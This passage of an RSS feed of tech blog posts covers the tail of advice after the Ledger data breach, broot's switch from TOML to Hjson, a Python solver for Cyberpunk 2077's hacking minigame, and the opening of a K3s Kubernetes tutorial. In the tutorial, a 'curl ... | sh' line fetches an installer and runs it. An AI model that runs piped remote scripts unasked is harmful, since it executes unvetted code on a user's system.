Changing Your Email address and/or Phone</h3><p>Once your email address is online, you will get lots of emails. Lists, such as Ledgerâ€™s, are recycled by spammers and attackers to create massive spam and phishing marketing campaigns. You should consider that email account compromised and, resultantly, you should open emails you receive very carefully! Even if it seems to you that the recipient may be trusted.</p><p>If you find that your primary email address is in the database, it is a good idea to change email accounts. While you might think that simply abandoning your old, compromised email address and updating your social accounts to the new email address that you have created would help, you might want to think twice. There is the risk that email providers can delete the email account and then there could eventually be an account takeover. So, do not completely abandon your old email address when changing the email address of your social accounts to your new email. While we are on the topic, it would make sense to change your password(s).</p><p>To change your cell phone, the procedure is a bit more complex. You could opt to buy a new data SIM and use it for your main accounts (bank, insurance, etc.). Another approach would be to change your mobile number, but there could be risks associated with this. In the first days, since the operation takes time and if you mess up, you risk finding your account blocked, because they often send a recovery SMS to your old number. In the future there is risk, because it is possible that the previously used mobile number will be recycled and assigned to another person.</p><p>Ultimately, be suspicious of any calls and emails you receive. After data breaches, phishing activity often occurs as criminals hope to take advantage of consumer fear and confusion.</p><h3 id="4-constantly-monitor-accounts">4. Constantly Monitor Accounts</h3><p>While you may think you are â€œimmuneâ€ to these threats, closely monitor all of your email, social, and banking accounts. Attackers often use social engineering to steal your identity in addition to sending phishing campaigns. Warn acquaintances and colleagues who may be receiving calls on your behalf and be sure to make them aware that they should not trust the individual(s) reaching out to them.</p><p>You should monitor any changes to your medical and insurance accounts. In addition, it is important to keep an eye on your financial and credit accounts. Identity thieves may have enough sensitive information to use your existing accounts or create new ones in your name.</p><p>If you think that your data has been used for crimes, report it immediately to federal, state, or local law enforcement!</p><h3 id="5-never-pay-ransoms-or-anything-else">5. Never pay ransoms or anything else!</h3><p>If you ever receive an email that threatens you and subsequently asks for a ransom, never pay them. If you think you are in danger and fear for your physical safety, please contact your local authorities right away.</p><p><img src="https://serhack.me/images/ledger/riscatto.png" alt=""></p><h3 id="6-prevent-it-from-happening-to-you-again">6. Prevent it from happening to you again!</h3><p>This current situation is truly alarming and it should be used as a lesson and a warning for the future. Undoubtedly, there will be many people asking themselves, â€œHow can I prevent this from happening again?â€ It is important to remember that while the company is to blame for this leak, it can also highlight a growing problem with regard to privacy protections. That is: How can you prevent this type of information (email address, home address, and cell phone) from getting into the wrong hands?</p><p>It is of the utmost importance that before doing simple things like making an online purchase or signing up for a social platform, that you read the tedious and bureaucratic Privacy Policy and Terms of Service. This way, you will be able to understand what data is collected and for what purpose it is used. If these disclosures are missing, it would already be a red flag.</p><p><em>Iâ€™m not affiliated with Ledger and Iâ€™m not taking any parts of the company. I just wanted to write the paragraph to wonder you how much information someone collects.</em></p><p><em>Let me know what you think, <a href="mailto:hi@serhack.me">contact me now</a>!</em></p><hr><h3 id="some-statistical-information">Some statistical information</h3><p>Table of email domains found in the data breach:</p><table><thead><tr><th>Domain</th><th>Number of occurrences found</th></tr></thead><tbody><tr><td>gmail.com</td><td>587.545</td></tr><tr><td>yahoo.com</td><td>62.630</td></tr><tr><td>outlook.com</td><td>14.794</td></tr><tr><td>protonmail.com</td><td>13.120</td></tr><tr><td>yandex.ru</td><td>4.865</td></tr><tr><td>tutanota.com</td><td>634</td></tr><tr><td>â€¦</td><td>â€¦</td></tr></tbody></table><p>Major states present:</p><table><thead><tr><th>States</th><th>Number of occurrences found</th></tr></thead><tbody><tr><td>United States</td><td>91.442</td></tr><tr><td>Germany</td><td>23.519</td></tr><tr><td>United Kingdom</td><td>21.130</td></tr><tr><td>France</td><td>17.263</td></tr><tr><td>Canada</td><td>12.730</td></tr><tr><td>Italy</td><td>5.672</td></tr><tr><td>Russia</td><td>4.953</td></tr><tr><td>Denmark</td><td>1.670</td></tr></tbody></table></div></div>]]>
            </description>
            <link>https://serhack.me/articles/how-to-react-data-breach-ledger/?hn=1</link>
            <guid isPermaLink="false">hacker-news-small-sites-25506289</guid>
            <pubDate>Tue, 22 Dec 2020 13:57:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why broot is switching from TOML to Hjson for its configuration files]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25505892">thread link</a>) | @todsacerdoti
<br/>
December 22, 2020 | https://dystroy.org/blog/hjson-in-broot/ | <a href="https://web.archive.org/web/*/https://dystroy.org/blog/hjson-in-broot/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
      <p>TOML was originally the only format for configuring broot.</p>
<p>Here I explain why Hjson is now the preferred one.</p>
<h2 id="why-i-started-with-toml">Why I started with TOML</h2>
<p>The reasons I chose <a href="https://github.com/toml-lang/toml">TOML</a> when I started working on <a href="https://github.com/Canop/broot">broot</a> may be familiar to many devs:</p>
<ul>
<li>all ancient configuration formats were already known to be flawed</li>
<li>it had "obvious" in the name so it was simple, right ?</li>
<li>it did look quite simple even if the <code>[[item]]</code> thing was a little puzzling</li>
<li>many of the usual problems of other formats weren't present (more on this later)</li>
<li>it was quite popular in the Rust world, since it had been chosen for cargo configuration</li>
<li>the deserialization tooling in Rust was very good</li>
</ul>
<p>The result in broot is it was quite OK and could accommodate the rich configuration of Broot.</p>
<p>It's still usable and I expect to keep it as an alternate format.</p>
<h2 id="the-problems-with-toml">The problems with TOML</h2>
<p>Most users still consider the language alien and confusing, the structure of a big and structured configuration doesn't clearly appear, and I've had too many reports of users not understanding why the line they added was ignored.</p>
<p>Here's an exemple of a case which puzzles users. <code>chars</code> is an array of items:</p>
<pre><code><span>[[chars]]
name = "A"
value = 10

[[chars]]
name = "B"
value = 11

prop = 3
</span></code></pre>
<p>What the user wanted here, when adding the last <code>prop</code>, was to set a top level property.</p>
<p>But what really happens is that the property is added to the second item of the <code>"chars"</code> array. It's kind of easy to spot in this short example, especially when you're used to TOML, but it's not at all in a big file.</p>
<p>The workaround here would be to put simple properties before the array but that's not how humans work.</p>
<p>Adding a line to a configuration file is something that linux users do all the time.</p>
<p>People whoâ€™ve been told that to achieve an effect they would have to add this line in their config.toml file wonâ€™t read the whole file to scan whether thereâ€™s a better location, theyâ€™re used to add it at the end as they do for example in their .bashrc file. Of course, coming back later they would probably try to organize everything but they wonâ€™t because their first reaction is that thereâ€™s a bug in the application since the added line did nothing.</p>
<p>Such traps aren't really OK when you're configuring a program, especially if you just touch the file occasionnally and don't want to be an expert in it.</p>
<p>So it seemed reasonable to switch to another format but, just like there's no <em>obvious</em> format, there's no <em>obvious</em> choice. Let's review them a little.</p>
<h2 id="what-s-a-configuration-file">What's a configuration file ?</h2>
<p>The patterns we use have quite settled and the model I describe here is about universal now.</p>
<p>For the program which reads it, a configuration file contains a <code>value</code>.</p>
<p>A <code>value</code> is either</p>
<ul>
<li>a string</li>
<li>a number -- a more precise taxonomy here is useful</li>
<li>a boolean -- we can deal without it but it's clearer</li>
<li>a list of values -- also called sequence, array, etc.</li>
<li>a map of keys (strings) to values -- such a map is often used as a "structured object"</li>
<li>the absence of a value -- which is especially important to fall back to a default</li>
</ul>
<p>But before to be read by a program, a configuration file is written by a human, it's read and modified by other humans. So there's much more to it.</p>
<p>First you need comments. There's no way around that.
The purpose of a value, its syntax and meaning, must be explained.
And comments are useful too to disable a setting, either temporarily or because it's here as an example.</p>
<p>Then you need the structure to be clear, the format not to push you towards errors.</p>
<p>You want users to be able to change values without reading everything.</p>
<p>And, unless your configuration structure is very small and guaranteed frozen, you want your users to be able to <em>add</em> properties.</p>
<p>And you'd rather have not too many meaningless characters to add to explain your meaning to the program (I won't even speak of XML...).</p>
<p>As we're in 2020 I'll consider UTF-8 as a given.</p>
<p>So let's look at the offering.</p>
<h2 id="usual-configuration-formats">Usual Configuration Formats</h2>
<p>Here's a list of more or less common file formats, with their advantages and problems as configuration formats.</p>
<h3 id="ini">INI</h3>
<p><a href="https://en.wikipedia.org/wiki/INI_file">INI files</a> are cool if you want to set a few properties but there's no real solution for anything deeply structured in those files.
So you always find yourself forced to migrate for something more serious.</p>
<h3 id="json">JSON</h3>
<p><a href="https://www.json.org/json-en.html">JSON</a> is ubiquitous as a data exchange format, with files that humans can read and even create or modify.</p>
<p>It generates few errors by itself and is quite clear.</p>
<p>It maps very well to program structures, and the tooling is abundant and good.</p>
<p>It has a few problems for our purpose, though:</p>
<ul>
<li>it lacks comments. In my opinion this is enough to make it unsuitable as a configuration format despite the fact it's a frequent choice</li>
<li>you can't have trailing commas, which means you often modify other lines when you add or remove one</li>
<li>bracing every key with quotes is painful and unnatural</li>
</ul>
<h3 id="yaml">YAML</h3>
<p><a href="https://en.wikipedia.org/wiki/YAML">YAML</a> is compact, quite clear and has comments.</p>
<p>But its space based syntax makes it prone to errors, makes big structures hard to decipher, and it's occasionally hard to debug the indentation related problems.</p>
<p>And it has this strange weirdness, which may matter or not : Do you know how to tell if you have a quoteless string or a boolean ? Probably not (<code>Off</code> is a boolean, see the regexp <a href="https://yaml.org/type/bool.html">here</a>).
This last problem can be lifted with the <a href="https://hitchdev.com/strictyaml/">Strict YAML</a> variant, though.
And it doesn't matter when you deserialize into the types required by the program's structure instead of applying the format typing rules.</p>
<h3 id="toml">TOML</h3>
<p>Coming after INI, JSON and YAML, TOML solves some of their problems.</p>
<p>It has comments, doesn't make you count invisible chars or put quotes everywhere.</p>
<p>And it has quite a good support for structured data...</p>
<p>Except lists of objects.</p>
<p>I already showed an example of problem but any deep configuration is a problem in TOML.</p>
<p>And nobody seems to understand what's really the syntax and how a human should parse it.</p>
<p>In my opinion this language should be reserved to when the structure is small and mostly frozen.</p>
<h3 id="hjson">Hjson</h3>
<p><a href="https://hjson.github.io/">Hjson</a> has a very limited purpose compared to other formats. It's not a normal serialization formats.
It's not meant to be written by programs: it's meant to be written by humans, read and modified by other humans, then read by programs. It has been from the start designed for this purpose which makes it suit configuration needs.</p>
<p>The tooling today for Hjson is far behind the one of the other formats I mentioned.</p>
<p>Most parsers or deserializers are really just converting with JSON (yes there's a big overhead).</p>
<p>For Rust, as I wanted a Serde <code>derive</code> guided deserialization, I had to write the <a href="https://github.com/Canop/deser-hjson">deserializer</a> myself (it's probably still buggy at this point).</p>
<p>In another case of Hjson being behind in tooling, in order for the blog example below to be clear, I had to select "CSS" as format for the style parser.</p>
<p>But Hjson, while not perfect, is much better than the other configuration formats of today for most applications:</p>
<ul>
<li>It's clear and almost "obvious"</li>
<li>It's already familiar, especially when dealing with lists and maps</li>
<li>There are less traps</li>
<li>You don't usually have to deal with escape sequences thanks to quoteless strings</li>
<li>There are facilities for multiline strings</li>
<li>You can have trailing commas, or no commas</li>
</ul>
<p>The whole file will be wrapped betwen braces, this isn't pretty, but that's a minor point. Another (small?) problem is that you may have a little too much indentation when dealing with deep structures.</p>
<p>A trap I found was about quoteless strings: The rule may be not obvious, especially the fact that a quoteless string can't start with a colon. A least the error is usually not silent here but I'd still recommend to avoid quoteless strings when surprising strings are expected (meaning you should then use a classical quoted string).</p>
<p>Note that some other formats went the same direction, but not so far:</p>
<ul>
<li><a href="https://json5.org/">JSON5</a> which fixes some shortcomings of JSON while still being more a general purpose or data exchange format than one really focused on human writing and use in configuration</li>
<li><a href="https://rome.tools/#rome-json">Rome Json</a> which does some of the changes Hjson does</li>
</ul>
<p>All in one I find this format to be less bad than the other ones and I expect to be more convincing with an example.</p>
<h3 id="example">Example</h3>
<p>Here's the current complete default configuration of broot:</p>
<pre><code><span>###############################################################
# This configuration file lets you
# - define new commands
# - change the shortcut or triggering keys of </span><span>built-in</span><span> verbs
# - change the colors
# - set default values for flags
# - set special behaviors on specific paths
# - and more...
#
# Configuration documentation is available at
#     https:</span><span>//</span><span>dystroy</span><span>.</span><span>org</span><span>/</span><span>broot
#
# This file'</span><span>s</span><span> format is Hjson ( https:</span><span>//</span><span>hjson</span><span>.</span><span>github</span><span>.</span><span>io</span><span>/ )
</span><span>#
###############################################################
</span><span>{

	###############################################################
	# Default flags
	# You can set up flags you want broot to start with by
	# default, for example `default_flags="ihp"` if you usually want
	# to see hidden and gitignored files and the permissions (then
	# if you don't want the hidden files you can launch `br -H`)
	# A popular flag is the `g` one which displays git related info.
	#
	# default_flags:

	###############################################################
	# Date/Time format
	# If you want to change the format for date/time, uncomment the
	# following line and change it according to
	# https://docs.rs/chrono/</span><span>0.4.11</span><span>/chrono/format/strftime/index.html
	#
	# date_time_format: %Y/%m/%d %R

	###############################################################
	# Whether to mark the selected line with a triangle
	#
	# show_selection_mark: true

	###############################################################
	# Column order
	# cols_order, if specified, must be a permutation of the following
	# array. You should keep the name at the end as it has a variable
	# length.
	#
	# cols_order: [
	# 	</span><span>mark</span><span>
	# 	</span><span>git</span><span>
	# 	</span><span>size</span><span>
	# 	</span><span>permission</span><span>
	# 	</span><span>date</span><span>
	# 	</span><span>count</span><span>
	# 	</span><span>branch</span><span>
	# 	</span><span>name</span><span>
	# ]

	###############################################################
	# True Colors
	# If this parameter isn'</span><span>t set, broot tries to automatically</span><span>
</span><span>	# â€¦</span></code></pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://dystroy.org/blog/hjson-in-broot/">https://dystroy.org/blog/hjson-in-broot/</a></em></p>]]>
            </description>
            <link>https://dystroy.org/blog/hjson-in-broot/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25505892</guid>
            <pubDate>Tue, 22 Dec 2020 13:14:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cyberpwned: Beating Cyberpunk 2077's hacking minigame with Python]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25505848">thread link</a>) | @asicsp
<br/>
December 22, 2020 | https://nicolas-siplis.com/blog/cyberpwned | <a href="https://web.archive.org/web/*/https://nicolas-siplis.com/blog/cyberpwned">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <h3>
                Cyberpwned: Beating Cyberpunk 2077's hacking minigame in 50 lines of Python
            </h3>
            <p>
                December 20, 2020
            </p><p>
                If you have a passing interest in anything gaming related and haven't been living under a rock for the last couple years, you're probably somewhat familiar with Cyberpunk 2077.
                After a long and repeatedly extended wait, it's finally here! And it has a hacking minigame! And getting a good score gets you better gear! 
                Can some quick Python magic give us the edge we need in this cruel, cruel Net? You bet. 
            </p>
            
            <p>
                A quick overview of the minigame: You're given a square matrix and one or more sequences of hexadecimal numbers, along with a buffer of certain length. 
                Your goal is to complete the most amount of sequences choosing as many nodes as the buffer allows.
                Each sequence will advance in progress if the node chosen is the next node in the sequence.
                When the game starts, you may choose any of the values in the first row of the matrix.
                After that, the values you can choose will alternate between the Nth column/row each turn, with N being the index of the last picked value.
                If this horrible description wasn't helpful, click <a href="https://www.rockpapershotgun.com/2020/12/14/cyberpunk-2077-hacking-minigame-breach-protocol-explained/">here</a> for a more detailed one, courtesy of RPS.
            </p>
            
            <p>
                All valid paths are considered and the final score of each path is calculated depending on how many sequences were completed by traversing it.
                The path with the best score is then printed to screen.
                The algorithm itself isn't particularly interesting nor efficient, unfortunately. However, it should be fast enough to solve any of Cyberpunk's minigames in a few seconds, so fast enough!
                I'm sure there's some low hanging fruit that could speed up execution, but I thought I'd share what I have so far and update the post as new ideas/suggestions come up.
            </p>
            

            <p>
                Let's start off with the game's components:
                    </p><ul>
                        <li>Code Matrix: Multidimensional array containing hexadecimal values (nodes), the "gameboard"</li>
                            <pre><code>
code_matrix = [
    [0x1c, 0xbd, 0x55, 0xe9, 0x55], 
    [0x1c, 0xbd, 0x1c, 0x55, 0xe9],
    [0x55, 0xe9, 0xe9, 0xbd, 0xbd],
    [0x55, 0xff, 0xff, 0x1c, 0x1c],
    [0xff, 0xe9, 0x1c, 0xbd, 0xff]
]
                            </code></pre>
                        <li>Buffer: Number indicating maximum number of chosen coordinates</li>
                            <pre><code>
buffer_size = 7
                            </code></pre>
                        <li>Coordinate: Specific point in the code matrix</li>
                        <li>Path: Ordered collection of unique coordinates which the user accessed</li>
                            <pre><code>
# The same coordinate can't be chosen more than once per path
class DuplicatedCoordinateException(Exception):
    pass

# All paths match the following pattern:
# [(0, a), (b, a), (b, c), (d, c), ...]
class Path():
    def __init__(self, coords=[]):
        self.coords = coords

    def __add__(self, other):
        new_coords = self.coords + other.coords
        if any(map(lambda coord: coord in self.coords, other.coords)):
            raise DuplicatedCoordinateException()
        return Path(new_coords)

    def __repr__(self):
        return str(self.coords)
                            </code></pre>
                        <li>Sequence: Paths that offer varying quality rewards if completed</li>
                            <pre><code>
sequences = [
    [0x1c, 0x1c, 0x55],
    [0X55, 0Xff, 0X1c],
    [0xbd, 0xe9, 0xbd, 0x55],
    [0x55, 0x1c, 0xff, 0xbd]
]
                            </code></pre>
                        <li>Score: Calculation that can be tweaked to prioritize different rewards</li>
                            <pre><code>
class SequenceScore():

    def __init__(self, sequence, buffer_size, reward_level=0):
        self.max_progress = len(sequence)
        self.sequence = sequence
        self.score = 0
        self.reward_level = reward_level
        self.buffer_size = buffer_size

    def compute(self, compare):
        if not self.__completed():
            if self.sequence[self.score] == compare:
                self.__increase()
            else:
                self.__decrease()

    # When the head of the sequence matches the targeted node, increase the score by 1
    # If the sequence has been completed, set the score depending on the reward level
    def __increase(self):
        self.buffer_size -= 1
        self.score += 1
        if self.__completed():
            # Can be adjusted to maximize either:
            #   a) highest quality rewards, possibly lesser quantity
            self.score = 10 ** (self.reward_level + 1)
            #   b) highest amount of rewards, possibly lesser quality
            # self.score = 100 * (self.reward_level + 1)

    # When an incorrect value is matched against the current head of the sequence, the score is decreased by 1 (can't go below 0)
    # If it's not possible to complete the sequence, set the score to a negative value depending on the reward 
    def __decrease(self):
        self.buffer_size -= 1
        if self.score &gt; 0:
            self.score -= 1
        if self.__completed():
            self.score = -self.reward_level - 1

    # A sequence is considered completed if no further progress is possible or necessary
    def __completed(self):
        return self.score &lt; 0 or self.score &gt;= self.max_progress or self.buffer_size &lt; self.max_progress - self.score

class PathScore():
    
    def __init__(self, path, sequences, buffer_size):
        self.score = None
        self.path = path
        self.sequence_scores = [SequenceScore(sequence, buffer_size, reward_level) for reward_level, sequence in enumerate(sequences)]
    
    def compute(self): # Returns the sum of the individual sequence scores
        if self.score != None:
            return self.score
        for row, column in self.path.coords:
            for seq_score in self.sequence_scores:
                seq_score.compute(code_matrix[row][column])
        self.score = sum(map(lambda seq_score: seq_score.score, self.sequence_scores))
        return self.score
                            </code></pre>
                    </ul>
            

            <p>
                The path generation is pretty similar to a DFS graph traversal. 
                The only significant difference is that the nodes accessible will vary depending on the current turn and the previous node's coordinates.  
            </p>
            <pre><code>
# Returns all possible paths with size equal to the buffer
def generate_paths(buffer_size):
    completed_paths = []

    # Return next available row/column for specified turn and coordinate.
    # If it's the 1st turn the index is 0 so next_line would return the 
    # first row. For the second turn, it would return the nth column, with n
    # being the coordinate's row
    def candidate_coords(turn=0, coordinate=(0,0)):
        if turn % 2 == 0:
            return [(coordinate[0], column) for column in range(len(code_matrix))]
        else:
            return [(row, coordinate[1]) for row in range(len(code_matrix))]

    # The stack contains all possible paths currently being traversed.
    def _walk_paths(buffer_size, completed_paths, partial_paths_stack = [Path()], turn = 0, candidates = candidate_coords()):
    
        path = partial_paths_stack.pop()
        
        for coord in candidates:
            try:
                new_path = path + Path([coord])
            
            # Skip coordinate if it has already been visited
            except DuplicatedCoordinateException:
                continue

            # Full path is added to the final return list and removed from the partial paths stack
            if len(new_path.coords) == buffer_size:
                completed_paths.append(new_path) 
            else: # Add new, lengthier partial path back into the stack
                partial_paths_stack.append(new_path) 
                _walk_paths(buffer_size, completed_paths, partial_paths_stack, turn + 1, candidate_coords(turn + 1, coord))

    _walk_paths(buffer_size, completed_paths)
    return completed_paths
            </code></pre>

            <p>
                Let's run it and check that everything is working correctly.
                While most of the breach protocol minigames have randomized values, the "Spellbound" quest involves a fixed state and the best solution is already known. Courtesy of GamerJournalist:
                <img src="https://img.gamerjournalist.com/spai/w_1024+q_lossy+ret_img+to_webp/https://cdn.gamerjournalist.com/primary/2020/12/How-to-decrypt-the-Book-of-Spells-in-Cyberpunk-2077.jpg">
            </p>

            <pre><code>
paths = [(path, PathScore(path, sequences, buffer_size).compute()) for path in generate_paths(buffer_size)]
max_path = max(paths, key=lambda path: path[1])
# [(0, 1), (2, 1), (2, 3), (1, 3), (1, 0), (4, 0), (4, 3)] -&gt; Should traverse 3rd and 4th sequences, finishes in ~3 seconds
print(max_path[0])
            </code></pre>

            <p>
                Success! Out of curiosity, I thought I'd try increasing the buffer size until I could find a path which cleared all sequences. 
                Be warned though, the result might take some time to compute since it has to go through every possible path of length 11.
            </p>
            <pre><code>
buffer_size = 11
paths = [(path, PathScore(path, sequences, buffer_size).compute()) for path in generate_paths(buffer_size)]
max_path = max(paths, key=lambda path: path[1])

# [(0, 0), (1, 0), (1, 3), (3, 3), (3, 1), (0, 1), (0, 3), (2, 3), (2, 0), (4, 0), (4, 2)] -&gt; Should traverse all sequences, finishes in ~40 seconds
print(max_path[0], max_path[1])
            </code></pre>

            <p>
                OK, optimization time! We'll assume that there's at least 1 path with a non-negative score.
                That way, we can actually stop traversing a partial path if its current score (adjusted depending on buffer's size and current turn) is lower than 0.
            </p>

            <pre><code>
def generate_paths(...):
    ...
    def _walk_paths(...):
    ...

                # Full path is added to the final return list and removed from the partial paths stack
                if len(new_path.coords) == buffer_size:
                    completed_paths.append(new_path)
                # If the partial path score is already lower than 0 we should be able to safely stop traversing it
                elif PathScore(new_path, sequences, buffer_size).compute() &lt; 0:
                    continue
                else: # Add new, lengthier partial path back into the stack
                    partial_paths_stack.append(new_path) 
                    _walk_paths(buffer_size, completed_paths, partial_paths_stack, turn + 1, candidate_coords(turn + 1, coord))
    ...
            </code></pre>

            <p>
                Let's try to get our original result with a buffer of length 7 again: 
            </p>

            <pre><code>
buffer_size = 7
paths = [(path, PathScore(path, sequences, buffer_size).compute()) for path in generate_paths(buffer_size)]
max_path = max(paths, â€¦</code></pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://nicolas-siplis.com/blog/cyberpwned">https://nicolas-siplis.com/blog/cyberpwned</a></em></p>]]>
            </description>
            <link>https://nicolas-siplis.com/blog/cyberpwned</link>
            <guid isPermaLink="false">hacker-news-small-sites-25505848</guid>
            <pubDate>Tue, 22 Dec 2020 13:08:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bare-Metal Kubernetes with K3s]]>
            </title>
            <description>
<![CDATA[
Score 186 | Comments 128 (<a href="https://news.ycombinator.com/item?id=25505735">thread link</a>) | @alexellisuk
<br/>
December 22, 2020 | https://blog.alexellis.io/bare-metal-kubernetes-with-k3s/ | <a href="https://web.archive.org/web/*/https://blog.alexellis.io/bare-metal-kubernetes-with-k3s/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
    <article>

        

        <section>
            <div><blockquote>
<p>Learn how to configure K3s on bare-metal to run a Kubernetes cluster with just as much resilience and fault tolerance as a managed service.</p>
</blockquote>
<p>This tutorial is a follow-on from my post <a href="https://blog.alexellis.io/kubernetes-in-10-minutes/">Kubernetes on bare-metal in 10 minutes</a> from 2017. The original post focused on getting <a href="https://kubernetes.io/">Kubernetes</a> working across a number of bare-metal hosts running Ubuntu, and then it went on to deploy a microservice and the dashboard. It was a primer, and written to help new users kick the tires with Kubernetes. It used production-ready kubeadm, but only used one master node, meaning it couldn't tolerate a failure.</p>
<p>In this post, I want to provide you with a HA, production-ready cluster on bare-metal infrastructure. We will use <a href="https://metal.equinix.com/">Equinix Metal</a> for the hosts, automate the boring parts, but do the rest step by step, so that you can get an understanding on what's going on under the hood.</p>
<p>In the conclusion, we will review the setup and discuss other options for running on-premises or in a homelab with Raspberry Pis. We will also compare kube-vip to other solutions for bare-metal and self-hosted networking.</p>
<p><img src="https://blog.alexellis.io/content/images/2020/12/kube-vip-ha-k3s--6-.png" alt="kube-vip-ha-k3s--6-"></p>
<blockquote>
<p>Conceptual diagram: kubectl access provided by the stable EIP. The IngressController also has an EIP which  routes traffic for services exposed with Ingress such as the OpenFaaS gateway.</p>
</blockquote>
<p>This post also moves from kubeadm to using <a href="https://k3s.io/">K3s</a> (a <a href="https://cncf.io/">CNCF</a> project), which requires fewer resources for its control-plane and has a built-in HA mode using embedded <a href="https://etcd.io/">etcd</a>. K3s has been generally available (GA) and production ready since 2019.</p>
<blockquote>
<p><a href="https://twitter.com/alexellisuk">Follow me on Twitter @alexellisuk</a></p>
</blockquote>
<h2 id="tutorial">Tutorial</h2>
<p>We will use <a href="https://www.terraform.io/">Terraform</a> to create the nodes on <a href="https://metal.equinix.com/">Equinix Metal (aka Packet)</a> servers, k3s to create a HA control-plane, and <a href="https://kube-vip.io/">kube-vip</a> to configure a HA IP address for the API server.</p>
<p>The setup will be able to tolerate at least one failure of a server. So unlike the 2017 post, our servers will form a HA cluster, and will also have an Elastic IP (EIP) configured so that the Kubernetes API server will remain accessible if one or more of the servers becomes unavailable.</p>
<p>In a Kubernetes cluster, the Cloud Controller Manager add-on has several responsibilities including node management, routing and managing services. At the end of the tutorial, not only will your cluster have a HA control-plane, a stable IP for the API Server, but Equinix Metal's (CCM) will also allow you to expose services as type LoadBalancer. Each IP address costs around 3.25 USD / mo, you can find out more details on the IP Addresses section of the dashboard.</p>
<p>Skill level: intermediate to advanced. You should be familiar with Kubernetes, networking and public cloud infrastructure.</p>
<h3 id="installtheprerequisites">Install the pre-requisites</h3>
<p>Download <a href="https://get-arkade.dev/">arkade</a>, a portable Kubernetes marketplace and downloader for DevOps CLIs. It will be used to download the tools we need for the tutorial. You are of course welcome to do things the hard way, if you prefer.</p>
<pre><code>curl -sLS https://dl.get-arkade.dev | sh

# Install the binary using the command given as output, such as: 
sudo cp arkade-darwin /usr/local/bin/arkade

# Or on Linux:
sudo cp arkade /usr/local/bin/arkade
</code></pre>
<p>Download the following CLIS:</p>
<ul>
<li><code>kubectl</code> - the Kubernetes CLI</li>
<li><code>k3sup</code> - a k3s installer that works over SSH</li>
<li><code>terraform</code> - an Infrastructure as code (IaC) tool, which we'll used to create the initial hosts</li>
<li><code>kubectx</code> - a fast way to check and switch your Kubernetes context between clusters</li>
</ul>
<pre><code>arkade get kubectl
arkade get k3sup
arkade get terraform
arkade get kubectx
</code></pre>
<p>Follow the step to put these binaries into your PATH:</p>
<pre><code># Add (k3sup) to your PATH variable
export PATH=$PATH:$HOME/.arkade/bin/
</code></pre>
<h3 id="provisionyournodes">Provision your nodes</h3>
<p>We will use terraform to provision three servers and two agents. You can alter these numbers, but three is the minimum number required for K3s' built-in HA mode using etcd.</p>
<p>You may well ask why the entire blog post isn't just a single Terraform command. I can hear you Hacker News. This point of this post isn't to do all the work for you, but to help you understand what is required, and in what order. Creating hosts is boring, so we are going to automate that and save you some time.</p>
<p>Save <code>main.tfvars</code> with the following:</p>
<pre><code>terraform {
  required_providers {
    packet = {
      source = "terraform-providers/packet"
      version = "~&gt; 3.2.1"
    }
  }
  required_version = "&gt;= 0.13"
}

variable "api_token" {
  description = "Equinix Metal API token"
}

variable "project_id" {
  description = "Equinix Metal Project ID"
}

variable "servers" {
  description = "Count of servers"
}

variable "agents" {
  description = "Count of agents"
}

provider "packet" {
  auth_token=var.api_token
}

resource "packet_ssh_key" "key1" {
  name       = "k3sup-1"
  public_key = file("/home/alex/.ssh/id_rsa.pub")
}

resource "packet_device" "k3s-server" {
  count		         = var.servers
  hostname         = "k3s-server-${count.index+1}"
  plan             = "c1.small.x86"
  facilities       = ["ams1"]
  operating_system = "ubuntu_20_10"
  billing_cycle    = "hourly"
  project_id       = var.project_id
  depends_on       = [packet_ssh_key.key1]
}

resource "packet_device" "k3s-agent" {
  count 	         = var.agents
  hostname         = "k3s-agent-${count.index+1}"
  plan             = "c1.small.x86"
  facilities       = ["ams1"]
  operating_system = "ubuntu_20_10"
  billing_cycle    = "hourly"
  project_id       = var.project_id
  depends_on       = [packet_ssh_key.key1]
}

output "server_ips" {
  value = packet_device.k3s-server.*.access_public_ipv4
}

output "agent_ips" {
  value = packet_device.k3s-agent.*.access_public_ipv4
}
</code></pre>
<p>Then create <code>main.tfvars</code></p>
<pre><code>api_token   =   ""
project_id  =   ""
servers     =   3
agents      =   2
</code></pre>
<p>Edit <code>api_token</code> and <code>project_id</code> with the values from the Equinix Metal dashboard. The API key is found on your user profile.</p>
<p>If you wish to change the size of the nodes, you can edit <code>c1.small.x86</code> and use a different value. You can find the options in your dashboard.</p>
<p>Now run the terraform to create the hosts:</p>
<pre><code>terraform init
terraform plan -var-file=main.tfvars
terraform apply -var-file=main.tfvars
</code></pre>
<p>When the hosts have been created, you'll get output with your IP addresses.</p>
<pre><code>agent_ips = [
  "147.75.81.203",
  "147.75.33.3",
]
server_ips = [
  "147.75.32.35",
  "147.75.80.83",
  "147.75.32.99",
]
</code></pre>
<p>Open a terminal and write environment variables for each:</p>
<pre><code>export SERVER1=""
export SERVER2=""
export SERVER3=""

export AGENT1=""
export AGENT2=""
</code></pre>
<p>Save this file as <code>hosts.txt</code> as you may need it again later.</p>
<h3 id="obtainanipaddressforthecontrolplane">Obtain an IP address for the control-plane</h3>
<p>K3s can run in a HA mode, where a failure of a master node can be tolerated. This isn't enough for public-facing clusters, where a stable IP address for the Kubernetes control-plane is required.</p>
<p>We need a stable IP for port 6443, which we could also call an Elastic IP or EIP. Fortunately BGP can help us there. One of our three master nodes will advertise its IP address as the route for the EIP, then if it goes down, another will start advertising. This means our clients can always depend on a stable address of: <code>https://$EIP:6443</code> for connecting to the Kubernetes API server.</p>
<p>Obtain an IP address from your EM dashboard:</p>
<ul>
<li>
<p>IPs &amp; Networks</p>
</li>
<li>
<p>Request IP Address</p>
</li>
<li>
<p>Select the same region that you'll use for the nodes:</p>
</li>
<li>
<p>Pick a <code>/32</code> for a single IP for the control-plane.</p>
